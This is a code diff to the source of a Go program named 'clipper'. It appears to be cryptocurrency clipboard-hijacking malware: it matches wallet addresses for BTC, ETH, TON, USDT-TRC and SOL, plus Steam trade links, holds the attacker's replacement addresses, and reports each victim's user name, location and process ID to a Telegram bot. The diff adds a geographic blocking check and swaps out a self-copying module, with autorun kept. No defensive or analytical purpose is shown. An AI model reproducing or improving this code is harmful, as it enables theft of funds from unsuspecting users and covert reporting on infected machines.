@@ -8,7 +8,7 @@ import (
 
 	"clipper/src/autorun"
 	"clipper/src/clipper"
-	"clipper/src/selfcopy"
+	"clipper/src/geoblock"
 	"clipper/src/telegram"
 	"clipper/src/utils"
 )
@@ -21,7 +21,6 @@ var (
 	tonRegex     = regexp.MustCompile(`^(?:EQ|UQ)[0-9A-Za-z_-]{46,48}$`)
 	usdttrcRegex = regexp.MustCompile(`^T[1-9A-HJ-NP-Za-km-z]{33}$`)
 	solRegex     = regexp.MustCompile(`^[1-9A-HJ-NP-Za-km-z]{32,44}$`)
-
 	steamTradeRegex = regexp.MustCompile(`(https?:\/\/)?steamcommunity\.com\/tradeoffer\/new\/\?partner=\d+(&token=[\w\-]+)?`)
 )
 
@@ -37,8 +36,12 @@ var (
 )
 
 var (
-	bot_token string
-	chat_id   string
+	bot_token   string
+	chat_id     string
+)
+
+var (
+	blockedGeos string
 )
 
 var matchers = []clipper.Matcher{
@@ -53,15 +56,21 @@ var matchers = []clipper.Matcher{
 }
 
 func main() {
-	selfPath, _ := utils.GetSelfPath()
-	selfName, _ := utils.GetSelfName()
+	// we checking geo block
+	geo := utils.GetGeo()
+	geoblock.GeoBlock(blockedGeos, geo)
 
-	if selfcopy.RunFromTemp(selfPath) {
+	// we checking addresses
+	if BtcAddr == "" && EthAddr == "" && LtcAddr == "" && DogeAddr == "" && 
+	   TonAddr == "" && UsdtTrcAddr == "" && SolAddr == "" && SteamAddr == "" {
+		fmt.Println("No addresses configured. Please rebuild with proper addresses.")
 		return
 	}
 
+	selfPath, _ := utils.GetSelfPath()
+	selfName, _ := utils.GetSelfName()
+
 	user, _ := user.Current()
-	geo := utils.GetGeo()
 	pid := syscall.Getpid()
 
 	// send start log to telegram
